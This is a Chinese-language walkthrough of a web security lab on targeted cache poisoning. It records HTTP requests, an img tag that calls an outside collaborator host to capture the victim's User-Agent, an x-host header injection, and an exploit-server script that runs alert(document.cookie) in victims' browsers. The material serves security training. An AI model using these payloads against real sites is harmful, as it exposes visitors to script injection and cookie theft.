# 实验室：利用未知头进行定向 Web 缓存投毒

本实验室存在 Web 缓存投毒漏洞。受害用户将查看你发布的任何评论。要解决本实验室，你需要投毒缓存，使响应在访客浏览器中执行 `alert(document.cookie)`。同时，你还需要确保该响应被提供给目标受害者所属的特定用户子集。


## 步骤

探测
- 访问首页
    ```http
    GET / HTTP/1.1
    Host: id.h1-web-security-academy.net
    ```

    - 响应
        ```http
        Vary: User-Agent
        ```
        - 使用浏览器头部作为缓存键，之后需获取受害者浏览器头部

        ```html
        <script type="text/javascript" src="//id.h1-web-security-academy.net/resources/js/tracking.js"></script>
        ```
    - 之后测试 Host 头注入

- 访问文章页面
    ```http
    GET /post?postId=4 HTTP/1.1
    Host: id.h1-web-security-academy.net
    ```

    - 响应

        ```html
        <span id='user-comments'>
            <script src='/resources/js/domPurify-2.0.15.js'>
            </script>
            <script src='/resources/js/loadComments.js'>
            </script>
            <script>
                loadComments('/post/comment')
            </script>
        </span>

        <div>
            HTML is allowed
        </div>
        ```
    - 此处评论功能中可包含 HTML 标签

- 查看脚本
    ```http
    GET /resources/js/loadComments.js HTTP/1.1
    Host: id.h1-web-security-academy.net
    ```
    - 响应

        ```js
        // 页面调用：loadComments('/post/comment')
        function loadComments(postCommentPath) {
            let xhr = new XMLHttpRequest();
            // 注册 XHR 状态变化事件：解析 JSON 格式，调用 displayComments 函数
            xhr.onreadystatechange = function() {
                if (this.readyState == 4 && this.status == 200) {
                    let comments = JSON.parse(this.responseText);
                    displayComments(comments);
                }
            };
            // XHR 的 GET 请求使用固定的相对路径 **拼接** 浏览器搜索参数
            xhr.open("GET", postCommentPath + window.location.search);
            xhr.send();

            // 尖括号与单双引号的单次全正则表达式匹配 HTML 编码，虽然单次，但使用正则表达式匹配所有。
            function escapeHTML(data) {
                return data.replace(/[<>'"]/g, function(c) {
                    return '&#' + c.charCodeAt(0) + ';';
                })
            }

            // 使用 innerHTML 插入用户输入的评论显示功能，仅对 body 字段使用库净化，其余字段进行 HTML 编码
            function displayComments(comments) {
                let userComments = document.getElementById("user-comments");

                for (let i = 0; i < comments.length; ++i) {
                    comment = comments[i];
                    let commentSection = document.createElement("section");
                    commentSection.setAttribute("class", "comment");

                    let firstPElement = document.createElement("p");

                    ... // 省略头像

                    if (comment.author) {
                        if (comment.website) {
                            let websiteElement = document.createElement("a");
                            websiteElement.setAttribute("id", "author");
                            websiteElement.setAttribute("href", comment.website);
                            firstPElement.appendChild(websiteElement)
                        }

                        let newInnerHtml = firstPElement.innerHTML + escapeHTML(comment.author)
                        firstPElement.innerHTML = newInnerHtml
                    }

                    ... // 省略日期

                    firstPElement.appendChild(avatarImgElement);

                    commentSection.appendChild(firstPElement);

                    // 仅对 body 字段使用 DOMPurify 库进行净化，允许链接属性，暴露 JS 伪协议
                    if (comment.body) {
                        let commentBodyPElement = document.createElement("p");
                        commentBodyPElement.innerHTML = DOMPurify.sanitize(comment.body, {
                            ALLOWED_TAGS: ['b', 'i', 'u', 'img', 'a'],
                            ALLOWED_ATTR: ['src', 'href']
                        });

                        commentSection.appendChild(commentBodyPElement);
                    }
                    commentSection.appendChild(document.createElement("p"));

                    userComments.appendChild(commentSection);
                }
            }
        };
        ```

- XHR 加载 JSON 格式的评论数据
    ```http
    GET /post/comment?postId=4 HTTP/1.1
    ```

    - 响应
        ```json
        [
            {
                "avatar": "",
                "website": "",
                "date": "2026-07-31T14:04:31.494Z",
                "body": "I like lemon rather than milk in my tea.",
                "author": "Andy Trick"
            },
            ...
        ```

- 查看 JS 代码后，定位兴趣点
    - 无代码执行兴趣点

- 设置图片原始的 src 到协作器，尝试获取受害者的浏览器类型
    ```html
    <img src="id.oastify.com">
    ```

    - 得到受害者连接

        ```http
        GET / HTTP/1.1
        Host: id.oastify.com
        Connection: keep-alive
        sec-ch-ua-platform: "Linux"
        User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
        sec-ch-ua: "Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"
        sec-ch-ua-mobile: ?0
        Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
        Sec-Fetch-Site: cross-site
        Sec-Fetch-Mode: no-cors
        Sec-Fetch-Dest: image
        Sec-Fetch-Storage-Access: active
        Referer: https://id.h1-web-security-academy.net/
        Accept-Encoding: gzip, deflate, br, zstd
        Accept-Language: en-US,en;q=0.9


        ```

尝试对页面加载的 JS 进行 Host 头覆盖攻击，或使用 Param Miner 扩展进行头部探测
- 使用扩展探测
    ```log
    Identified parameter on id.h1-web-security-academy.net: x-host~%h:%s
    ```
    - 注意，issues 显示的信息可能错误。需在扩展的输出界面查看探测结果，并在 logger 中搜索对应项目以手动查看请求

- 手动测试头部
    ```http
    GET / HTTP/1.1
    Host: id.h1-web-security-academy.net
    x-host: foo


    ```
    - 响应

        ```html
        <script type="text/javascript" src="//foo/resources/js/tracking.js">
        </script>
        ```
    - 成功注入 host 头部
    - 设置/移除对应 miss/hit，确认当前头部非缓存键

当前工具：
- HTML 加载脚本的 Host 头部注入，导致加载攻击者 JS
- Host 头部注入的载荷非缓存键，导致任意存在脚本 Host 注入漏洞的页面均可被缓存
- 应用程序使用用户代理头部作为缓存键，已知目标用户的代理

在首页执行 JS 源的缓存投毒，并设置目标用户代理头部以精确攻击
- 端点页面设置
    ```js
    alert(document.cookie)
    ```

- 请求
    ```http
    GET / HTTP/1.1
    Host: id.h1-web-security-academy.net
    User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
    ```

- 响应
    ```html
    <script type="text/javascript" src="//exploit-id.exploit-server.net/exploit#/resources/js/tracking.js">
    </script>
    ```

